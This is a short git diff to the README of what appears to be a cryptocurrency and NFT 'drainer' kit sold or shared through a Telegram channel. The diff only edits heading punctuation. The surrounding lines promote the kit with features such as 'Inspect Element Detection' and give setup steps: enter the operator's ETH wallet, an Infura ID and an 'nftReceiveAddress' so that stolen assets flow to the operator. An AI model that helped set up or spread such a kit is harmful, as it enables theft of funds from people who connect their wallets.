@@ -8,7 +8,7 @@
 
 ### 📩 DM me here: [@Zentoh](https://t.me/zentoh) or join our [Group](https://t.me/CryptoDrainers) to follow updates!
 
-## `💎 Features`
+## `💎 Features :`
 - [x] Inspect Element Detection
 - [x] Custom Design
 - [x] Cool design 
@@ -19,7 +19,7 @@
 
 ---
 
-## `✍ Setup Guide:` 
+## `✍ Setup Guide :` 
 you need to edit the **settings.js** file only. 
 - line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**
 - line 2: const infuraId = `"APP ID";` replace **PROJECT ID with your Infura ID**
@@ -30,7 +30,7 @@ you need to edit the **settings.js** file only.
 
 ---
 
-## `☁️ Important (PLEASE READ BEFORE):` 
+## `☁️ Important (PLEASE READ BEFORE) :` 
 
 - Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
 - Edit lines : nftReceiveAddress: **"YOUR WALLET"**, replace this your ETH wallet address.
